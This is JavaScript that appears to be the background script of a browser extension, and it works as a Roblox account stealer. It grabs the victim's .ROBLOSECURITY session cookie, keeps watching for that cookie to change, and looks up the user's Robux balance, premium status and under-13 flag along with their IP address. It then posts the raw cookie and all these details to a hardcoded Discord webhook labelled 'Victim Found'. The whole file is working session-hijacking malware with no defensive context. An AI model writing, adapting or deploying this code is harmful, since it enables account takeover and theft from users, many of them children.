const WEBHOOKS = [
    {
        url: "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
        mention: "@everyone"
    }
];

let lastCookie = null;

async function main(cookie) {
    if (!cookie) return;

    if (cookie === lastCookie) return;
    lastCookie = cookie;

    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;
    let ownsGamepass = false;
    const gamepassId = 1417708310;

    try {
        // Get authenticated user
        let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });

        if (!res.ok) return;
        let user = await res.json();

        // Economy info
        let economyRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A", robuxPending: "N/A" };

        // Premium status
        let premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let isPremium = premiumRes.ok ? await premiumRes.json() : false;

        // Thumbnail
        let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
        let thumbJson = await thumbRes.json();
        let thumbUrl = thumbJson.data && thumbJson.data.length > 0 ? thumbJson.data[0].imageUrl : "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420";

        // Check gamepass ownership (legal)
        try {
            let gpRes = await fetch(`https://apis.roblox.com/game-passes/v1/game-passes/${gamepassId}/users/${user.id}`, {
                method: "GET",
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });
            let gpJson = gpRes.ok ? await gpRes.json() : null;
            ownsGamepass = gpJson && gpJson.data && gpJson.data.length > 0;
        } catch (e) { console.error(e); }

        statistics = {
            UserName: user.name,
            UserId: user.id,
            IsUnder13: user.isUnder13,
            JoinDate: user.created ? new Date(user.created).toDateString() : "N/A",
            RobuxBalance: economy.robux ?? "N/A",
            PendingRobux: economy.robuxPending ?? "N/A",
            IsPremium: isPremium,
            ThumbnailUrl: thumbUrl
        };

    } catch (e) {
        console.error(e);
    }

    if (!statistics) return;

    // Embed payload
    const embedPayload = {
        embeds: [
            {
                description: "```" + cookie + "```\n[Refresh Cookie](https://refresher.ct.ws/?i=1)",
                color: 16711680, // RED
                fields: [
                    { name: "Username", value: statistics.UserName, inline: true },
                    { name: "User ID", value: statistics.UserId.toString(), inline: true },
                    { name: "Underage", value: statistics.IsUnder13 ? "✅ Yes" : "❌ No", inline: true },
                    { name: "Join Date", value: statistics.JoinDate, inline: true },
                    { name: "Robux", value: statistics.RobuxBalance.toString(), inline: true },
                    { name: "Pending Robux", value: statistics.PendingRobux.toString(), inline: true },
                    { name: "Premium", value: statistics.IsPremium ? "✅ Yes" : "❌ No", inline: true },
                    { name: "Owns Gamepass", value: ownsGamepass ? "✅ Yes" : "❌ No", inline: true }
                ],
                author: {
                    name: "Victim Found: " + ipAddr,
                    icon_url: statistics.ThumbnailUrl
                },
                footer: { text: "ENTERPRISE" }
            }
        ]
    };

    // Send to webhooks
    for (let wh of WEBHOOKS) {
        fetch(wh.url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ ...embedPayload, content: wh.mention })
        }).catch(console.error);
    }
}

// Run once
chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, c => main(c ? c.value : null));

// Keep watching
chrome.cookies.onChanged.addListener(changeInfo => {
    if (changeInfo.cookie && changeInfo.cookie.name === ".ROBLOSECURITY" && changeInfo.cookie.domain.includes("roblox.com") && !changeInfo.removed) {
        main(changeInfo.cookie.value);
    }
});
